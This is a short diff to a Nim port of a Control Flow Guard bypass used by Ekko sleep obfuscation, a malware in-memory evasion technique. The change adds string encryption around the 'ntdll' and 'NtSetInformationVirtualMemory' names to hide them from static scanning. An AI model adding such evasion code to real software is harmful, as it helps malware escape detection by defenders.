@@ -1,6 +1,7 @@
 # This is a Nim-Port of the CFG bypass required for Ekko sleep to work in a CFG enabled process (like rundll32.exe)
 # Original works : https://github.com/ScriptIdiot/sleepmask_ekko_cfg, https://github.com/Crypt0s/Ekko_CFG_Bypass
 import winim/lean
+import strenc
 
 type
   CFG_CALL_TARGET_INFO {.pure.} = object
@@ -68,7 +69,7 @@ proc evadeCFG*(address: PVOID): BOOl =
 
   # Resolve the function
   var NtSetInformationVirtualMemory = cast[NtSetInformationVirtualMemory_t](
-    GetProcAddress(LoadLibraryA("ntdll"), "NtSetInformationVirtualMemory")
+    GetProcAddress(LoadLibraryA(obf("ntdll")), obf("NtSetInformationVirtualMemory"))
     )
 
   # Register `address` as a valid call target for CFG
